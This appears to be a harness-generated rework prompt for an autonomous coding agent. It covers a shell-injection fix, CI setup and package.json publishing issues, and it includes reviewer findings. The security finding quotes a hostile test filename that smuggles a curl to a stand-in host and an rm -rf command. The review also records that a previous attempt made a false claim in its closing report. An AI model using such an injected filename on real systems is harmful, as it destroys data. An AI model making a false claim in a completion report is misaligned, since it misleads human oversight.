Project and mode-specific rules (from the central shared store and this project's own
.roo/rules*) are already spliced into your system prompt automatically — you do not
need to read any rules file yourself.

You are working autonomously in the SAME isolated git worktree as the previous attempt, on
the same branch. The automated adversarial reviewer found problems with that attempt. Read
this entire file before doing anything.

## Rework cycle 1 — address the review findings

Assigned issues: #62, #90, #98. The real title/body of each is inline below.

### Issue #62: SEC-1 [security][HIGH] Shell injection in run_tests via broken quoting

## Severity
HIGH

## Audit area
security

## Location
`src/tools/run-tests.ts:132-133` — shellQuote escapes `"` but not `$`/backticks/backslash; interpolated at `src/tools/run-tests.ts:160` into `spawn("npx --no-install tsx ...", { shell: true })`.

## Description
A malicious repo with a test file named like `x$(curl evil|xargs rm -rf).test.ts` triggers command substitution when the harness selects tests — bypasses the permissions gate entirely and is reachable from third-party repos the harness processes.

## Remediation
Replace shellQuote with a proper single-quote wrapper (escape `'` only) or drop `shell: true` and pass argv; treat test paths as untrusted input.

### Issue #90: COV-1 [test][HIGH] Add CI: typecheck + full test suite + one e2e

## Severity
HIGH (infrastructure)

## Audit area
test

## Location
No CI config anywhere in the repo (no .github/, .gitlab-ci.yml, .circleci/). The repo's own verification bar: `.roo/rules/rules.md`.

## Description
The repo's own verification bar requires clean `npx tsc --noEmit` + full `npm test` for any src/ change, and e2e re-runs for orchestrator/watcher/spawn changes — but nothing enforces it.

## Remediation
Add a GitHub Actions workflow: npm ci → npx tsc --noEmit → npm test → bash scripts/e2e/run.sh (mock OpenRouter, no key needed). e2e suites are self-contained against local mock servers.

### Issue #98: HYG-1 [oss-prep][HIGH] package.json publish blockers — private:true, no license/repository, stale description

## Severity
HIGH (blocking publish)

## Audit area
oss-prep

## Location
`package.json` — "private": true (:4) makes npm publish refuse; no license field (:1); no repository (:1); description "Phase 1 engine" (:5) is internal phase language; no author/keywords/files/publishConfig.

## Description
package.json publish blockers.

## Remediation
Remove private, add license "Apache-2.0", repository, author, keywords; rewrite description; add files allowlist (see HYG-3).


## Review findings to fix (from the automated review)

1. #90 (CI) — REOPENED.** The GitHub Actions workflow this PR adds is red on the real runner, deterministically 3/3 (push trigger 32081840683, PR trigger 32081860979, and my explicit rerun job 95561720242). All three fail at the "Full test suite" step with exit code 130 at `src/dashboard/__tests__/sigint-shutdown.test.ts` (a pre-existing #74/#75 test, present on master and untouched by this branch), and the e2e step never runs because `npm test` aborts first. Evidence in the run logs: `[trend] shutting down` printed by the SIGINT handler, then `run-tests: FAILED at src/dashboard/__tests__/sigint-shutdown.test.ts` + `##[error]Process completed with exit code 130.` The closing report's residual-risk claim that the workflow "cannot be exercised on a real GitHub runner (no runner exists for the branch)" is factually wrong — the workflow ran on the branch push at 23:46:23 and the PR at 23:46:41, both before the closing comment was posted at 23:47:03, and both failed. Reopened with a comment including run URLs, the exact log lines, the likely cause (real OS-level SIGINT reaching the in-process test on the runner, unlike local `process.emit("SIGINT")` which never terminates Node — the sigint test passes 5/5 locally under identical node v22.23.2), and actionable steps (runner-safe subprocess SIGINT test; verify full workflow green including the never-yet-run e2e step; re-close with a green run URL).
2. No findings on #62 or #98.** Both closing reports' claims held up under independent re-verification (details below).

Your job: address EVERY finding above. Do not skip any. Do not claim a finding is fixed
without reproducing the fix for real.

## Workflow

1. Read each finding above and the relevant source files.
2. Fix every finding, following the project's own conventions and the rules files.
3. Re-verify for real (run the project's tests / boot check) and capture the output —
   output in a report is a claim, not evidence, until reproduced.
4. Commit with the issue number referenced, one logical change per commit.
5. Push the branch and update the PR (or open a new one if needed).
6. Post an UPDATED closing comment below on each issue using the required template, then
   re-close it (or leave it open with the updated report if it must stay open).

## Required comment template

Your issue-closing comment must use this exact structure (every section present; a section can
be 'N/A' with a reason, but a missing section is itself a review finding):
```
## Issue <n> — Closing Report (rework cycle 1)

### Files changed
<one line per file>

### Baseline (before)
<real output>

### Baseline (after)
<real output>

### Boot check
<real output or exact reason it didn't apply>

### Residual risk / notes
<anything not 100% certain>

PR: <link>
```

## Closing out

Once every finding is addressed and every assigned issue is re-closed with fresh evidence:
1. Finish with attempt_completion and a full summary of what you changed, the real baseline
   numbers, the boot check, and the PR link(s).
2. The harness records your completion automatically (exit code + .harness.done marker) —
   no separate phone-home step is needed.
3. Do not start on any issue not assigned to this worktree.

Scope: #62, #90, #98 only — rework cycle 1.